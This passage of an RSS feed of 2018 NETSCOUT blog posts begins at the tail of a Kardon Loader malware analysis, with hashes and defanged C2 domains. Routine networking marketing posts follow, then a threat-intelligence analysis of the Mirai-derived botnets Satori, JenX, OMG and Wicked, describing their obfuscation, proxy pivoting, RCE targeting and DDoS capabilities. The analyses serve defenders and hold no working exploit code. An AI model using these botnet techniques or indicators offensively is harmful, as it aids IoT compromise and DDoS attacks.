<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_panel2.png"><img alt="Kardon Loader Store" class="size-large wp-image-9577" height="452" src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_panel2-1024x514.png" width="900" /></a> Figure 8: Kardon Loader Store[/caption] <span class="TextRun SCXW69772349" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW69772349">Users can specify a URL then provide the task type and number of executions in order to distribute commands to bots on the network. </span></span><span class="TextRun SCXW69772349" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW69772349">This is shown in the actors instructional YouTube video</span></span><span class="TextRun SCXW69772349" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW69772349"> (</span></span><strong><span class="TextRun SCXW69772349" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW69772349">Figure 4</span></span></strong><span class="TextRun SCXW69772349" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW69772349">)</span></span><span class="TextRun SCXW69772349" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW69772349">.</span></span><span class="EOP SCXW69772349"> </span></p>

<h2>Conclusion and Recommendations</h2>

<p>This article is an overview of the downloader malware known as Kardon Loader. Kardon Loader is a fully featured downloader, enabling the download and installation of other malware, eg. banking trojans/credential theft etc. Downloaders are a critical part of the malware ecosystem, often developed by specialists and sold independently of the trojan that is the objective of the campaign. Although only in public beta stage this malware features bot store functionality allowing purchasers to open up their own ￼botshop￼ with this platform. The actor started advertising this loader in late April and has communicated further development will do done on this loader in the future, including encrypted C2 communications.</p>

<p>At a minimum organizations should leverage the indicators contained within this report to block malicious activity associated with Kardon Loader. Researchers may also leverage the Yara rule below to look for additional copies of Kardon Loader to extract other IOCs for blocking malicious activity.</p>

<h3>Yara Rule</h3>

<ul><li><a href="https://gist.github.com/arbor-asert/2ad9c7d715f41efc9d59ed8c425d10d3">https://gist.github.com/arbor-asert/2ad9c7d715f41efc9d59ed8c425d10d3</a></li>
</ul><h3>Hashes</h3>

<ul><li><span class="TextRun Highlight SCXW81600825" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW81600825">fd0dfb173aff74429c6fed55608ee99a24e28f64ae600945e15bf5fce6406aee</span></span></li>
	<li><span class="TextRun Highlight SCXW28929297" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW28929297">b1a1deaacec7c8ac43b3dad8888640ed77b2a4d44f661a9e52d557e7833c7a21</span></span></li>
	<li><span class="TextRun Highlight SCXW95472926" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW95472926">3c64d7dbef4b7e0dd81a5076172451334fe9669800c40c895567226f7cb7cdc7</span></span></li>
</ul><h3>Command and Control URLs</h3>

<ul><li>Kardon[.]ddns[.]net</li>
	<li>Jhuynfrkijucdxiu[.]club</li>
	<li>Kreuzberg[.]ru</li>
	<li>Cryptdrop[.]xyz</li>
</ul>]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Kardon%20Loader%20Advertisement.png" length="71804" type="image/png"/>
    <guid isPermaLink="false">b0212c5d-73cc-49c7-94f8-59ea86210082</guid>
    <pubDate>Tue, 19 Jun 2018 12:00:34 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Revamping HTTP and DNS for a Brave New 5G World</title>
  <link>http://localhost:7996/blog/revamping-http-and-dns-brave-new-5g-world</link>
  <description>As the brave new world of 5G approaches, HTTP and DNS are being revamped to meet the needs of our evolving digital universe. These protocols have served us well, and with these considered modifications, will continue to support our connected world.</description>
  <content:encoded><![CDATA[<p>The simple act of surfing the Internet requires the most fundamental of protocols in order to work. HTTP, which stands for Hypertext Transmission Protocol, and DNS, which represents Domain Name System, are backbone standards that make everything possible. HTTP allows the transfer of data between a web browser and the corresponding web page or application located on a server on the network. Because HTTP uses a universal standard protocol to communicate, everyone can access everything on the web.</p>

<p>DNS enables a user’s device to translate a URL, also known as a web address, into an IP address that can then be utilized by a machine to navigate the network. Without these two very basic protocols, accessing the Internet in all its vastness would literally be impossible.</p>

<p>With the advent of 5G and <a href="https://www.netscout.com/solutions/virtualization/?ls=PR-MKTG&amp;lsd=blog-1-061218-1">virtualization</a>, HTTP and DNS are going through an extensive remodeling process to introduce low latency versions, as well as software versions to run in the cloud. This is being done to increase the visibility and proactive assurance of these critically important web service facilitators.<br />
<br />
There’s nothing truly profound in what is happening with HTTP and DNS today. These protocols have undergone a near constant evolution as technology has changed. The latest trends in network function virtualization (NFV) and multi-access edge computing (MEC) are spurring on the newest changes to HTTP and DNS protocols.</p>

<p>As a result of NFV and MEC, HTTP is being streamlined and made lighter to accommodate the coming high speed requirements of 5G. This will be particularly instrumental for smartphones that access content on wireless networks. A flawless user experience will be highly dependent on the best transmission performance.</p>

<p>With the impending deployment of billions of IoT devices, improvement to DNS will be needed to ensure connectivity for discovering and addressing these devices. One of the key developments under way is an effort called DNS Service Discovery (DNS-SD), which enables rapid discovery of local devices and services by making all devices multicast with each other in a peer-to-peer fashion. This advancement will allow DNS-SD to evolve more efficiently in the future because it won’t require centralized query servers and a lot of manual configuration.<br />
<br />
As the brave new world of 5G approaches, HTTP and DNS are being revamped to meet the needs of our evolving digital universe. These protocols have served us well, and with these considered modifications, will continue to support our connected world.</p>

<p>This blog is based on the article, <a href="https://www.solutions-numeriques.com/http-et-dns-dans-un-monde-en-5g/" target="_blank"><em>HTTP and DNS in a 5G world</em></a><em>, </em>written by Daniel Crowe, Regional Director France and Southern Europe for NETSCOUT, which was published at Solutions Numeriques.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/HTTP_DNS_5G_World.jpg" length="133266" type="image/jpeg"/>
    <guid isPermaLink="false">2bc7f40d-775b-4a08-8fc1-bf5b1fe4b44d</guid>
    <pubDate>Mon, 18 Jun 2018 13:10:11 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>LPWA Will Have to Suffice Until 5G Arrives</title>
  <link>http://localhost:7996/blog/lpwa-will-have-suffice-until-5g-arrives</link>
  <description>The growth of Internet of Things (IoT) applications is exploding. Industry analysts predict IoT connected devices will grow to almost 31 billion worldwide by 2020, and more than 75 billion by 2025.</description>
  <content:encoded><![CDATA[<p>The growth of Internet of Things (IoT) applications is exploding. Industry <a href="https://www.statista.com/statistics/471264/iot-number-of-connected-devices-worldwide/" target="_blank">analysts</a> predict IoT connected devices will grow to almost 31 billion worldwide by 2020, and more than 75 billion by 2025.</p>

<p>The rapid adoption of IoT devices, particularly those found in autonomous vehicles and smart factories, require real-time response in less than a millisecond. Unfortunately, the higher latency of LTE, which is in the double-digit range, is completely insufficient. The answer to this problem is 5G, but so far the fifth-generation network exists only in pilot programs.&nbsp;</p>

<p>The high cost of implementing 5G has been an impediment to its rollout. In Europe, it is estimated that a half trillion euro investment will be required to put an entirely new infrastructure in place. Renewed antennas, new and expanded fiber optic networks will have to be laid, and additional transmission towers must be set up. There is no doubt that 5G is coming, but steep costs mean significant changes are still a prospect for the future.</p>

<p>In the meantime, low-power wide-area technologies (LPWA), such as Narrowband IoT (NB-IoT), Sigfox and LoRA, present a viable alternative as a bridge to 5G. LPWA low-traffic networks offer important advantages, such as the low power consumption of IoT endpoints, low module cost and maintenance, low latency, high building penetration, and the ability to transmit data over long distances.</p>

<p>Over the course of the next couple of years, NB-IoT will likely be the most variable transition technology because no new infrastructure is needed. NB-IoT can utilize existing LTE networks via software upgrades. NB-IoT is highly scalable, allowing millions of endpoints to be connected in a single network.</p>

<p>NB-IoT offers telecommunication providers a critical opportunity to monetize IoT transactions. Providers will be able to take advantage of new revenue streams made possibly by service level agreements (SLAs) for IoT devices and services. However, in order to make this work, service quality will have to be high. Transmission errors and packet loss could result in SLA penalties. For this reason, effective <a href="https://www.netscout.com/network-monitoring/?ls=PR-MKTG&amp;lsd=blog-1-061118-1">network monitoring</a> is needed.</p>

<p><br />
The right network monitoring solution will reveal which components are communicating with each other, making dependencies transparent. These insights will make it possible to detect system changes and Quality of Service (QoS) level issues, so rapid trouble shooting can take place. If NB-IoT is going fill the technology gap until 5G comes into force, businesses will need to ensure the availability, reliability, responsiveness, and security of their network IoT services.&nbsp;</p>

<p>This blog is based on the article, <a href="https://www.industry-of-things.de/warten-auf-5g-was-bestehende-netze-jetzt-leisten-muessen-a-681460/" target="_blank"><em>Waiting for 5G: what existing networks have to do now</em></a><em>, </em>written by Dr. Martin Klapdor, Senior Solutions Architect for NETSCOUT, which was published at Industry of Things.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/5G_IoT.jpg" length="272068" type="image/jpeg"/>
    <guid isPermaLink="false">22945618-ec45-465f-8864-ad7b29e0052e</guid>
    <pubDate>Mon, 11 Jun 2018 13:39:42 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Martin Klapdor</dc:creator>
    </item>
<item>
  <title>The Horse Race for Multi-cloud Services Dominance</title>
  <link>http://localhost:7996/blog/horse-race-multi-cloud-services-dominance</link>
  <description>In today’s digital universe, multi-cloud is the strategy of choice for enterprises of all shapes and sizes. Enterprises and large organizations require the scale and flexibility that cloud provides to grow their businesses and remain competitive.</description>
  <content:encoded><![CDATA[<p>In today’s digital universe, multi-cloud is the strategy of choice for enterprises of all shapes and sizes. Enterprises and large organizations require the scale and flexibility that cloud provides to grow their businesses and remain competitive. This trend is borne out by the results of RightScale’s annual <a href="https://www.rightscale.com/blog/cloud-industry-insights/cloud-computing-trends-2018-state-cloud-survey" target="_blank"><em>State of the Cloud Survey</em></a> which found 81 percent of enterprises are taking a multi-cloud approach. The survey goes on to reveal that public cloud adoption has increased to 92 percent in 2018 from 89 percent in 2017, while private cloud adoption increased to 75 percent in 2018 from 72 percent the prior year.</p>

<p><a href="https://www.rightscale.com/blog/cloud-industry-insights/cloud-computing-trends-2018-state-cloud-survey#enterprise-public-cloud-spend" target="_blank">Adoption</a> rates are confirmed by predictions for increased public cloud investment. Survey respondents indicated that 20 percent of enterprises plan to more than double public cloud spend in 2018, and 71 percent stated they expect to increase public cloud spend more than 20 percent.</p>

<p>The undisputed leaders in the cloud services space are AWS and Microsoft Azure.&nbsp; AWS remains dominant, but this past year, Azure has grown quickly, closing the gap with its biggest competitor. The <em>State of the Cloud</em> survey found that amongst enterprises, Azure increased adoption significantly from 43 percent to 58 percent, while AWS adoption increased from 59 percent to 68 percent. Clearly, we are seeing a horserace between industry giants, such as Amazon, Microsoft, and Google, as more and more enterprises migrate services and applications to public cloud infrastructures.</p>

<p>Enterprises are increasingly embracing multi-cloud strategies because of the significant benefits. However, the need for pervasive visibility is key to business success. As hybrid cloud becomes a progressively important part of the mix, organizations should be looking to take a <a href="https://www.netscout.com/solutions/smart-data/?ls=PR-MKTG&amp;lsd=blog-1-06.04.18-1">smart data approach</a> to ensure they have the visibility they need. Such an approach can deliver a highly-detailed picture of the hybrid IT environment, making service assurance possible. Armed with these invaluable insights, IT is able to gain a clear understanding of applications and service availability, reliability and responsiveness - both in real time and back-in-time – which allows them to more rapidly troubleshoot service issues. Having a “back-in-time” capability allows IT to learn from past mistakes and modify service delivery to mitigate future issues and risks.</p>

<p>Leveraging actionable intelligence based on an analysis of service and application dependencies is absolutely vital for mitigating business and IT risks, and maximizing investments in innovative cloud technologies.</p>

<p>This blog is based on the article, <a href="http://www.mwee.com/news/aws-azure-growth-proves-future-multi-cloud/page/0/1" target="_blank"><em>AWS, Azure growth proves the future is multi-cloud</em> </a>written by Michael Segal, Area Vice President Strategy at NETSCOUT, which was published on Microwave Engineering Europe.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/horse_race_multi_cloud.jpg" length="58248" type="image/jpeg"/>
    <guid isPermaLink="false">92b9fbae-8736-41ac-a5f1-f7ec8f45545c</guid>
    <pubDate>Wed, 06 Jun 2018 19:05:49 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Michael Segal</dc:creator>
    </item>
<item>
  <title>Smart Contracts Still Require Blockchain Service Assurance</title>
  <link>http://localhost:7996/blog/smart-contracts-still-require-blockchain-service-assurance</link>
  <description>According to recent research, the global blockchain market is expected to be worth $20 billion by 2024. The future success and acceptance of smart contracts rests largely on the ability of blockchain operators to control all network interfaces and connected applications.</description>
  <content:encoded><![CDATA[<p>To hear the experts talk about it, blockchain is the next greatest thing since sliced bread. And if growing investments in this technology are any indication, those experts are probably right. According to recent research, the global <a href="https://expandedramblings.com/index.php/blockchain-statistics/" target="_blank">blockchain</a> market is expected to be worth $20 billion by 2024.</p>

<p>Blockchain, which is essentially a decentralized peer-to-peer network database, is giving rise to smart contracts that automate processes in today’s digitally connected world. Leveraging blockchain technology, smart contracts consist of several nodes that store data for each transaction, making items available for review, negotiation, and eventually enabling the completion of the contract.</p>

<p>In a nutshell, the way this works is that the blockchain receives data and uses its software code to validate that certain pre-established contract conditions have been met. The system then triggers an action. Because smart contracts take the form of program code on the blockchain, they can be viewed by all authorized parties and all actions and files receive a time stamp that represents legal proof of existence.<br />
<br />
Since blockchain is decentralized across countless servers with no single authority in control of the contents, the accuracy of smart contract documentation is assured. Many consider smart contracts to be largely forgery-proof.</p>

<p>In the case of public blockchain, smart contracts offer some major advantages, such as the fact that there is no central release point or that large computing power is not required. The contents of these smart contracts can be revised quickly by rewriting and uploading the program code. This makes the technology easy and cost-effective to implement in existing IT infrastructures.</p>

<p>Of course, smart contracts are only useful if the blockchain technology they are built on is reliable. When many conditions are defined in a contract, it is likely that some nodes of the blockchain will be in different systems. This creates tremendous complexity, putting greater stress on IT to ensure there is no failure. As blockchain systems are spread across multiple servers, it becomes far more challenging to pinpoint errors and ensure the stability of the technology.</p>

<p>In short, if the root cause of any problems are not quickly identified and mitigated, smart contracts can fail. Ensuring the functionality of the blockchain, and in turn, ensuring the viability of smart contracts, requires that monitoring mechanisms must be put in place. Disruptions can be avoided by using a holistic end-to-end view of packet and data streams, gateways, servers and the network to achieve <a href="https://www.netscout.com/solutions/service-assurance/?ls=PR-MKTG&amp;lsd=blog-1-060118-1">service assurance</a>. By taking such an approach, IT can more effectively detect and correct errors before they cause extensive harm to chain operations.</p>

<p>The future success and acceptance of smart contracts rests largely on the ability of blockchain operators to control all network interfaces and connected applications.</p>

<p><br />
This blog is based on the article, <a href="https://www.funkschau.de/telekommunikation/artikel/150364/" target="_blank"><em>Opportunities and Challenges of Smart Contracts</em></a><em>, </em>written by Dr. Martin Klapdor, Senior Solutions Architect for NETSCOUT, which was published at Funkschau.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/blockchain.jpg" length="236366" type="image/jpeg"/>
    <guid isPermaLink="false">67eb2dbc-4f30-44c1-8d4d-33d1fea1715c</guid>
    <pubDate>Mon, 04 Jun 2018 13:03:36 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Martin Klapdor</dc:creator>
    </item>
<item>
  <title>OMG - Mirai Minions are Wicked</title>
  <link>http://localhost:7996/blog/asert/omg-mirai-minions-are-wicked</link>
  <description>Executive Summary Mirai, seen as revolutionary for malware that targets the Internet of Things (IoT), has wrought destruction around the globe and popularized IoT based malware. Mirai was utilized by attackers to launch multiple high-profile, high-impact DDoS attacks against various Internet properties and services in 20161. Since the release of Mirai’s source code, IoT botnet...</description>
  <content:encoded><![CDATA[<h2>Executive Summary</h2>

<p>Mirai, seen as revolutionary for malware that targets the Internet of Things (IoT), has wrought destruction around the globe and popularized IoT based malware. Mirai was utilized by attackers to launch multiple high-profile, high-impact DDoS attacks against various Internet properties and services in 2016<a href="#footnote"><sup>1</sup></a>. Since the release of Mirai’s source code, IoT botnet authors have used it as a framework to build new malware. Authors have expanded the original Mirai code base with new capabilities and functionality while making some improvements. In this blog post we’ll delve into four Mirai variants; Satori, JenX, OMG and Wicked, in which the authors have built upon Mirai and added their own flair. Satori leveraged remote code injection exploits to enhance the Mirai code, while JenX removed several features from the code and instead relies on external tools for scanning and exploitation. OMG was also added to the Mirai legacy. OMG adds a novel feature in the form of an HTTP and SOCKS proxy. These proxy features enable the infected IoT device to act as a pivot point. The bot author now has the flexibility to launch additional scans for new vulnerabilities, or additional attacks without having to update the original binary. Depending on the type of IoT device, and how its connected, the bot author can pivot to private networks which are connected to the infected IoT device. The latest minion to hit the scene is Wicked. Wicked’s flair is the ability to target Netgear routers and CCTV-DVR devices which are vulnerable to remote code execution (RCE) flaws. Within the RCE exploit, Wicked would include instructions to download and execute a copy of the Owari bot. Often, the scanning and exploitation of devices can be automated, resulting in any susceptible devices becoming part of the botnet.</p>

<h2>Key Findings</h2>

<ul>
	<li>Satori bolts on remote code injection exploits to Mirai’s scanning feature.</li>
	<li>The JenX bot evolved from Mirai to include similar coding, and eliminated the scanning and exploitation capabilities.</li>
	<li>OMG bot, a recent entrant to the IoT malware scene, capitalizes on the Mirai source code and expands it to add HTTP and SOCKS proxy capabilities.</li>
	<li>Wicked, the latest Mirai minion, leverages RCE flaws to infect Netgear routers and CCTV-DVR devices. When vulnerable devices are found, a copy of the Owari bot is downloaded and executed.</li>
</ul>

<h2>IoT Summary</h2>

<p>IoT covers a wide range of devices, including (but not limited to):</p>

<ul>
	<li>IP base cameras</li>
	<li>cable/DSL modems</li>
	<li>DVR systems</li>
	<li>medical devices</li>
</ul>

<p>Any embedded device that runs an operating system and has networking ability (send/receive data over a network) can be considered an IoT device. IoT devices quickly go to market and have low costs. These factors lend them to suffer from the most basic types of vulnerabilities. Vulnerabilities including:</p>

<ul>
	<li>hard code/default credentials</li>
	<li>buffer overflows</li>
	<li>command injection</li>
</ul>

<p>Most consumer IoT devices contain these types of vulnerabilities. When patches are released to address these issues, they are rarely applied. Typically, a consumer plugs in an IoT device and never contemplates the security aspect, or perhaps does not understand the necessity of applying regular security updates and patches. With nearly 27 billion connected devices in 2017 rising to 125 billion by 2030, according to new analysis from IHS Markit<a href="#footnote"><sup>2</sup></a>, they make an extremely attractive target for malware authors.</p>

<h2>IoT Malware</h2>

<p>In the latter half of 2016, a high-visibility DDoS attack against a DNS hoster/provider was observed, which affected a number of major online properties. The malware responsible for this attack, among others, was Mirai. Mirai built its massive infrastructure by using a telnet brute force password attack against IP cameras and home routers. The credential list used by Mirai consisted of factory default credentials. On September 30, 2016 the source code for Mirai was published. Since then the Mirai source code has been a major influence on a slew of recent IoT based botnets (explained in detail below):</p>

<ul>
	<li>Satori</li>
	<li>JenX</li>
	<li>OMG</li>
	<li>Wicked</li>
</ul>

<h2>Satori Overview</h2>

<p>NETSCOUT Arbor saw several variants of Satori in the wild from December 2017 through January 2018. Each of these variants used Mirai as its foundation. Variant 2 (977534e59c72dafd0160457d802f693d) used the default credential scanning while variant 3 (440af2606c5dc475c9a2a780e086d665ca203f01) added the use of two remote code exploits. Variant 4 (9c677dd17279a43325556ec5662feba0) made the biggest splash as it was the first IoT bot to target the ARC architecture. For this example, we’ll focus on Satori variant 3. The 3rd variant of Satori uses the same configuration table as Mirai (<strong>Figure 1</strong> &amp; <strong>Figure 2</strong>). Variant 3 also uses the same string obscuration technique as Mirai and simply modifies the XOR key to “0x07”. These same features can be found in OMG. In the case of OMG the author utilizes the XOR key of “deadbeef,” as we’ll see later. The XOR key of “deadbeef” is the original key from the Mirai source code. <img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure1.png" /> Figure 1: Satori configuration table (table_init) function <img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure2.png" /> Figure 2: Mirai configuration table (table_init) function[/caption] We see the author expanding on Mirai source code to include different exploits such as the Huawei Home Gateway exploit as show in <strong>Figure 3</strong>.<img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure3.png" /> Figure 3: Huawei Home Gateway Exploit[/caption] The SHA1 for the Satori variant 3 sample referenced above was 440af2606c5dc475c9a2a780e086d665ca203f01 and was first submitted to Virus Total on 12/05/2017.</p>

<h2>JenX Overview</h2>

<p>JenX is another example of an IoT botnet where the underlying code originates with Mirai. JenX includes several of the Mirai’s DDoS capabilities, uses the same configuration table, and includes the same string obfuscation technique. <strong>Figure 4</strong> and <strong>Figure 5 </strong>is a comparison between the attack_udp_generic attack code in JenX and Mirai. OMG shares several similarities with JenX, but one area OMG differs is the use of the HTTP DDoS attack which originated from Mirai. The HTTP DDoS attack has been removed from JenX, but is still available in OMG. <img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure4.png" width="470" /> Figure 4: attack_udp_generic DoS Attack JenX <img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure5.png" /> Figure 5: attack_udp_generic DoS Attack Mira[/caption] Instead of storing the C2 in the configuration table like Mirai, JenX chooses to hard code the IP address of the CNC as shown in <strong>Figure 6</strong>. <img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure6.png" /> Figure 6: resolve_cnc_addr Function[/caption] Notably, JenX removed the scanning and exploitation functions. A separate system handles this functionality, which is major departure from Mirai, Satori, and OMG. Currently, it appears JenX only focuses on DDoS attacks against players of the video game Grand Theft Auto San Andreas, which has been noted by other researchers. The SHA1 for the JenX sample referenced above was 5008b4a7048ee0a013465803f02cb9c4bffe9b02 and was first submitted to Virus Total on 02/01/2018.</p>

<h2>OMG Overview</h2>

<p>One of the most interesting Mirai spawns is the OMG botnet. As with the other botnets discussed, OMG uses Mirai as its framework and supports all of the functionality in Mirai. What makes OMG stand out is how the author expanded the Mirai code to include a proxy server. OMG incorporates 3proxy, which allows it to enable a SOCKS and HTTP proxy server on the infected IoT device. &nbsp;With these two features, the bot author can proxy any traffic of its choosing through the infected IoT device. Including additional scans for new vulnerabilities, launching additional attacks, or pivot from the infected IoT device to other networks which are connected to the device. OMG leverages the same type of configuration table as Mirai, Satori, and JenX to enable or disable iptables rules, which allows access to the proxy servers. OMG adds two new entries into the configuration table to handle adding and removing iptables rules (<strong>Figure 7</strong>). <img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure7.png" /> Figure 7: OMG configuration table (table_init) function[/caption] <strong>Figure 8</strong> is a snippet of the obfuscated iptables command referenced by the configuration table above. Using an XOR key of “deadbeef” we can retrieve the deobfuscated iptables command (<strong>Figure 9</strong>). <img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure8.png" /> Figure 8: OMG XOR’ed iptables command <img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure9.png" /> Figure 9: OMG deobfuscated iptables command[/caption] <strong>Figure 10</strong> is the function that controls the iptables rules. The command retrieve is used to access the configuration table values (<strong>Figure 7</strong>). <img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure10.png" /> Figure 10: OMG iptables function[/caption] As shown in the figures above, the author of OMG has expanded on the original Mirai source code to handle the new proxy functionality. The SHA1 for the OMG sample referenced above was 0ed366c1af749cbda25ff396f28a6b7342d5dcd9 and was first submitted to Virus Total on 1/15/2018.</p>

<h2>Wicked Overview</h2>

<p>Wicked is the latest Mirai minion to rear its ugly head. Similar to Satori variant 3, Wicked trades in Mirai’s credential scanning function for its own RCE scanner. Wicked’s RCE scanner targets Netgear routers and CCTV-DVR devices. <strong>Figure 11</strong> is an excerpt of the scanner function in which the RCE payloads are defined. [caption id="attachment_9569" align="aligncenter" width="477"]<img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure11.png" /> Figure 11: RCE exploits[/caption] Wicked continues with the long-standing tradition of using Mirai’s string obfuscation technique. As with the minions before it, Wicked also switches the XOR key from “0xdeadbeef”. As shown in <strong>Figure 12</strong>, we see the obfuscated strings ending in “0x37”. It’s a good indication that Wicked is using “0x37” as the XOR key, as C character strings should be null terminated. <img src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Figure12.png" /> Figure 12: Wicked’s obfuscated strings[/caption] Using the XOR key of “0x37”, we can decode the obfuscated strings. While reviewing the decoded strings the following ASCII art was found:</p>

<ul>
	<li>“echo '¯\_(ツ)_/¯ Oh hey there... Looks like I might of inected your device.' &gt;&gt; /wicked.txt.”</li>
</ul>

<p>Wicked writes the messages to the following locations:</p>

<ul>
	<li>/root</li>
	<li>/home</li>
	<li>/temp</li>
	<li>/</li>
</ul>

<p>At this point these files do not appear to be used by Wicked. They may be used as a calling card by the author. The SHA1 for the Wicked sample referenced above was b8e8c107d242cc0b7516cf7908b67e108a7d927e, and was first submitted to Virus Total on 5/05/2018.</p>

<h2>Mirai DDoS attack types</h2>

<p>All of the aforementioned IoT botnets use the same attack types supported by the original Mirai source code. The following DDoS capabilities exist in Mirai, and OMG:</p>

<ul>
	<li>TCP flooding</li>
	<li>UDP flooding</li>
	<li>Valve Source Engine (VSE) query-flooding</li>
	<li>GRE-flooding</li>
	<li>pseudo-random DNS label-prepending attacks (also known as DNS ‘Water Torture’ attacks)</li>
	<li>HTTP GET, POST, and HEAD attacks</li>
</ul>

<p><strong>NOTE: </strong>Satori, JenX, and Wicked support the same DDoS capabilities, except for the HTTP attacks.</p>

<h2>Mirai DDoS Defense</h2>

<p>All relevant network infrastructure, host/application/service, and DNS Best Current Practices (BCPs) should be implemented by network operators with public-facing network infrastructure and/or Internet properties. Organizations that use NETSCOUT Arbor SP may ingest flow telemetry (e.g., NetFlow, IPFIX,s/Flow, cflowd/jflow, Netstream, et. al.) into the appliance, which provides the ability to detect, classify, and traceback DDoS attack traffic. Flow telemetry is used to identify IP addresses of the attacking IoT devices and the attack type(s) used. If the attacker is using non-spoofed DDoS attacks, the IP addresses of the attacking IOT devices can be blocked using Black-/White-lists on NETSCOUT Arbor APS/TMS. In addition to existing capabilities to rapidly detect, classify, traceback, and mitigate DDoS attacks launched by these IoT botnets, the latest release of NETSCOUT Arbor SP/TMS provides additional enhancements which provide increased levels of automation &amp; provisioning.</p>

<h2>Conclusion</h2>

<p>Using Mirai as a framework, botnet authors can quickly add in new exploits and functionally, thus dramatically decreasing the development time for botnets. The Mirai source is not limited to only DDoS attacks. A variant of Satori was discovered which attacks Ethereum mining clients<a href="#footnote"><sup>3</sup></a>.&nbsp; As seen with the four samples covered above, botnet authors are already using the Mirai source code as their building blocks. As the explosion of IoT devices does not look to be slowing down, we believe we’ll continue to see increases in IoT botnets. We are likely to see remnants of Mirai live on in these new botnets as well. Malware authors will continue to leverage IoT based malware in automated fashion, quickly increasing the botnet size through worm-like spreading, network proxy functionality, and automated exploitation of vulnerabilities in internet facing devices. It is important for organizations to apply proper patching, updates, and DDoS mitigation strategies to defend their organizations.</p>

<h4 id="footnote">Footnotes</h4>

<ol>
	<li><a href="https://asert.arbornetworks.com/mirai-iot-botnet-description-ddos-attack-mitigation/">Mirai IoT Botnet Description DDOS Attack Mitigation</a></li>
	<li><a href="http://news.ihsmarkit.com/press-release/number-connected-iot-devices-will-surge-125-billion-2030-ihs-markit-says">Number Connected IoT Devices Will Surge 125 Billion 2030 ihs Markit Says</a></li>
	<li><a href="https://blog.netlab.360.com/art-of-steal-satori-variant-is-robbing-eth-bitcoin-by-replacing-wallet-address-en">Art of Steal Satori Variant is Robbing eth Bitcoin by Replacing Wallet Address</a> &nbsp;</li>
</ol>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Mirai%20Minions%20are%20Wicked.png" length="225051" type="image/png"/>
    <guid isPermaLink="false">09ac54ae-1d42-44e4-b85b-47d55cb8b66a</guid>
    <pubDate>Thu, 31 May 2018 13:24:33 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Off is Not an Option: Automating Digital &amp; Wireless Testing</title>
  <link>http://localhost:7996/blog/not-option-automating-digital-wireless-testing</link>
  <description>The Internet of Things (IoT) is fast encroaching on nearly every aspect of our lives. In fact, Business Insider magazine predicts there will be more than 55 billion IoT devices by 2025, up from approximately nine billion in 2017.</description>
  <content:encoded><![CDATA[<p>The Internet of Things (IoT) is fast encroaching on nearly every aspect of our lives. In fact, <a href="http://www.businessinsider.com/the-internet-of-things-2017-report-2017-1" target="_blank"><em>Business Insider</em></a> magazine predicts there will be more than 55 billion IoT devices by 2025, up from approximately nine billion in 2017.</p>

<p>Of course, with all these connected devices, the need to manage and maintain millions of wired and wireless endpoints in a constantly growing and highly complex network environment is creating challenges of epic proportions for field engineers. IT needs to be able to rapidly pinpoint and resolve problems across every inch of their network, so they can assure the delivery of vital services.</p>

<p>Taking all connected devices offline, while searching for the cause of the problem, is simply not an option. This means IT needs a tool that will identify which endpoint is miscommunicating across multiple wireless devices, while the devices continue to function.</p>

